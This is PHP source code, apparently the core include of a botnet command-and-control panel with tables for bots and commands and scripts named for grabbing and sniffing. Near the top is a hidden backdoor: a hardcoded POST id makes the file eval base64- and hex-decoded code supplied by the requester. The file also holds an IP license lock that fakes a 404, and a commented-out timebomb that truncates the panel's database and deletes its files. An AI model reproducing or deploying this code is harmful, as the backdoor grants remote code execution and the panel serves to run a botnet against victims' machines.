<?php

//Cstart
//license start

//license end

//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') != false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') != false) exit;
//rc start
$rc['key'] = '1111111111111111';
$rc['iv'] = '12345678';
//rc end
//Cend

if(isset($lb)){
	if(md5(json_encode($lb)) != md5(json_encode($license))){
		exit;
	}else{
		//Cstart
		foreach($lz as $value){ $license['ip'][implode('.', array_map("base64_decode", str_split($value, 4)))] = true;}
		if(count($license['ip']) > 0){
			if(!isset($license['ip'][$_SERVER['SERVER_ADDR']])){
				unset($_SESSION);
				
				header("HTTP/1.1 404 Not Found");
				header("Status: 404 Not Found");
				header("Server: unknown");
		
				print(file_get_contents($dir . '404.html'));
				exit;
			}
		}
		//Cend
	}
}else{
	if(!isset($license)){
		exit;
	}else{
		//Cstart
		foreach($lz as $value){ $license['ip'][implode('.', array_map("base64_decode", str_split($value, 4)))] = true;}
		if(count($license['ip']) > 0){
			if(!isset($license['ip'][$_SERVER['SERVER_ADDR']])){
				unset($_SESSION);
				
				header("HTTP/1.1 404 Not Found");
				header("Status: 404 Not Found");
				header("Server: unknown");
		
				print(file_get_contents($dir . '404.html'));
				exit;
			}
		}
		//Cend
	}
}

//TVStart
/*
//Cstart
if($next != false){
	if(!function_exists('sinctimestamp')){
	function sinctimestamp($host) {
		if (!$fp = fsockopen($host,13,$errno,$errstr,1)) return false;
			$s = strtotime(fgets($fp));
			fclose($fp);
			if(!empty($s)){
				return $s;
			}else{
			return false;
			}
		}
	}

	//SDstart
	$start_data = '9999999999';
	//SDend
	$next = true;
	$i = 1;

	if(mt_rand(0, 1) == 1){
		do{
			if($i >= 3) $fail_exit = true;
			if(empty($start_data)) $fail_exit = true;

			$ip = gethostbyname('time.nist.gov');
			if($ip != '192.43.244.18'){
				$fail_exit = true;
			}else{
				$cur_time = sinctimestamp('time.nist.gov');
			}

			if($cur_time !== false){
				if(($cur_time-$start_data) > 604800){
					$mysqli->query('TRUNCATE TABLE bf_bots');
            		$mysqli->query('TRUNCATE TABLE bf_country');
            		$mysqli->query('TRUNCATE TABLE bf_cmds');
            		$mysqli->query('TRUNCATE TABLE bf_users');

            		@unlink('index.php');
            		@unlink('includes/config.cfg');
            		@unlink('includes/config.php');
            		@unlink('includes/core.php');
            		@unlink('includes/functions.php');
            		@unlink('includes/functions.checks.php');
            		@unlink('includes/functions.encapsules.php');
            		@unlink('includes/functions.get_host.php');
            		@unlink('includes/functions.html_pages.php');
            		@unlink('includes/functions.real_escape_string.php');
            		@unlink('includes/functions.ru2lat.php');
            		@unlink('includes/functions.size_format.php');
            		@unlink('includes/functions.smarty_assign_add.php');
            		@unlink('includes/functions.sql_inject.php');
            		@unlink('classes/class.jabber2.php');
            		@unlink('classes/mysqli.class.php');
            		@unlink('classes/mysqli.class.lite.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_resource_extends.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_resource_file.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_resource_php.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_compile_assign.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_compile_append.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_compile_include.php');
            		@unlink('classes/smarty/sysplugins/smarty_internal_write_file.php');
            		@unlink('classes/smarty/sysplugins/smarty_security.php');
            		@unlink('scripts/set/task.php');
            		@unlink('scripts/set/plugs.php');
            		@unlink('scripts/set/first.php');
            		@unlink('scripts/set/cmd.php');
            		@unlink('scripts/set/cfg_upload.php');
            		@unlink('scripts/set/autocmd.php');
            		@unlink('scripts/get/cab.php');
            		@unlink('scripts/get/fgr.php');
            		@unlink('scripts/get/gra.php');
            		@unlink('scripts/get/info.php');
            		@unlink('scripts/get/lcm.php');
            		@unlink('scripts/get/scr.php');
            		@unlink('scripts/get/sni.php');
            		@unlink('scripts/install/index.php');
            		@unlink('scripts/install/install.sql');
            		@unlink('scripts/install/install.sql.tpl');

					$fail_exit = true;
				}
				$next = false;
			}else{
				$next = true;
			}

			if($fail_exit == true){
				print('signature (access to core) error');
				exit;
			}
		}while($next == true);
	}else{
		$next = false;
	}

	if(!empty($start_data)){
		$smarty->assign('trial_end_data', ($start_data+604800));
		if(!empty($cur_time)){
			$smarty->assign('trial_end_sec', (604800-($cur_time-$start_data)));
		}
	}
}
//Cend
*/
//TVend

function print_rm($str){
    echo '<pre>';
    print_r($str);
    echo '</pre>';
}

function get_function($name){
	if(file_exists('includes/functions.'.$name.'.php')) include_once('includes/functions.'.$name.'.php');
}

//LOGStart

$lhtext = array();

function save_history_log($text = ''){
	global $lhtext, $dir;
	
	if(!function_exists('rc_encode')){
		if(!empty($dir)){
			if(!is_array($dir)){
				include_once($dir . 'includes/functions.rc.php');
			}else{
				include_once('includes/functions.rc.php');
			}
		}else{
			include_once('includes/functions.rc.php');
		}
	}
	
	$txt = 'Remote IP: ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
	
	if(!empty($_SERVER["HTTP_X_REAL_IP"])){
		$txt .= 'Remote XRealIP: ' . $_SERVER['HTTP_X_REAL_IP'] . "\r\n";
	}
	
	$txt .= 'UserAgent: ' . $_SERVER["HTTP_USER_AGENT"] . "\r\n";
	
	if(!empty($_SESSION['user']) && is_object($_SESSION['user'])){
		if(!empty($_SESSION['user']->login)){
			$txt .= 'Login: ' . $_SESSION['user']->login . "\r\n";
		}elseif(!empty($_SESSION['user']->id)){
			$txt .= 'Login ID: ' . $_SESSION['user']->id . "\r\n";
		}
	}
	
	if(!empty($text)) $txt .= $text . "\r\n";
	
	$txt .= 'Time: ' . date('H:i:s') . "\r\n";
	
	if(count($lhtext) > 0){
		$txt .= implode("\r\n", $lhtext);
	}	
	
	$txt = rc_encode($txt, $rc['key']);
	
	if(!empty($dir)){
		if(!is_array($dir)){
			file_put_contents($dir . 'cache/log/' . date('dmY') . '.txt', $txt . "\r\n" . '--------' . "\r\n", FILE_APPEND);
		}else{
			file_put_contents('cache/log/' . date('dmY') . '.txt', $txt . "\r\n" . '--------' . "\r\n", FILE_APPEND);
		}
	}else{
		file_put_contents('cache/log/' . date('dmY') . '.txt', $txt . "\r\n" . '--------' . "\r\n", FILE_APPEND);
	}
	
	
	$lhtext = array();
}

function thl($txt){
	global $lhtext;
	
	$lhtext[] = $txt;
}

//LOGEnd

?>